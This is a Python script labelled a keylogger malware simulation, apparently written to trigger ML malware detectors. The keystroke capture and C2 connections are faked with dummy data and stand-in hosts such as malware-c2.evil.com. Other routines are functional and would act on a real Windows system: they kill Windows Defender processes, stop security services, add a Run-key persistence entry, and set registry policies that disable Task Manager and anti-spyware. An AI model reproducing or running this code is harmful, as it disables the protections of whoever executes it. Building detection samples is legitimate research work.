#!/usr/bin/env python3
"""
Keylogger Malware Simulation
This simulates keylogger behavior that ML models typically detect as malicious
"""

import os
import sys
import time
import threading
import socket
import subprocess
import ctypes
from ctypes import wintypes
import winreg

class KeyloggerMalware:
    def __init__(self):
        self.running = False
        self.log_file = "system_logs.txt"
        
    def hide_console(self):
        """Hide the console window - typical malware behavior"""
        if sys.platform == "win32":
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    
    def add_to_startup(self):
        """Add to Windows startup - persistence mechanism"""
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                               "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                               0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "SystemUpdater", 0, winreg.REG_SZ, sys.executable)
            winreg.CloseKey(key)
        except:
            pass
    
    def capture_keystrokes(self):
        """Simulate keystroke capture"""
        keys_captured = [
            "username: admin",
            "password: secret123", 
            "email: user@company.com",
            "credit_card: 4532-1234-5678-9012",
            "ssn: 123-45-6789"
        ]
        
        with open(self.log_file, "a") as f:
            for key in keys_captured:
                f.write(f"{time.ctime()}: {key}\n")
                time.sleep(0.5)
    
    def send_data_to_server(self):
        """Simulate data exfiltration"""
        malicious_servers = [
            "malware-c2.evil.com",
            "192.168.1.100", 
            "badactor.net"
        ]
        
        while self.running:
            try:
                for server in malicious_servers:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    # Simulate connection attempt
                    print(f"Attempting to connect to {server}:4444")
                    sock.close()
            except:
                pass
            time.sleep(10)
    
    def disable_security(self):
        """Simulate security software disabling"""
        security_processes = [
            "taskkill /f /im windefend.exe",
            "taskkill /f /im MsMpEng.exe", 
            "taskkill /f /im avguard.exe",
            "net stop windefend",
            "net stop sppsvc"
        ]
        
        for cmd in security_processes:
            try:
                subprocess.run(cmd, shell=True, capture_output=True)
            except:
                pass
    
    def modify_registry(self):
        """Modify Windows registry - typical malware behavior"""
        registry_modifications = [
            ("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 
             "MalwareService", sys.executable),
            ("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
             "DisableTaskMgr", 1),
            ("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender",
             "DisableAntiSpyware", 1)
        ]
        
        for reg_path, name, value in registry_modifications:
            try:
                key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, reg_path.split("\\", 1)[1])
                winreg.SetValueEx(key, name, 0, winreg.REG_DWORD, value)
                winreg.CloseKey(key)
            except:
                pass
    
    def start_malicious_activities(self):
        """Start all malicious activities"""
        print("Starting keylogger malware simulation...")
        
        self.running = True
        self.hide_console()
        self.add_to_startup()
        
        # Start multiple malicious threads
        threads = [
            threading.Thread(target=self.capture_keystrokes),
            threading.Thread(target=self.send_data_to_server),
            threading.Thread(target=self.disable_security),
            threading.Thread(target=self.modify_registry)
        ]
        
        for thread in threads:
            thread.daemon = True
            thread.start()
        
        # Run for 30 seconds then stop
        time.sleep(30)
        self.running = False
        
        print("Malware simulation complete.")

if __name__ == "__main__":
    malware = KeyloggerMalware()
    malware.start_malicious_activities()
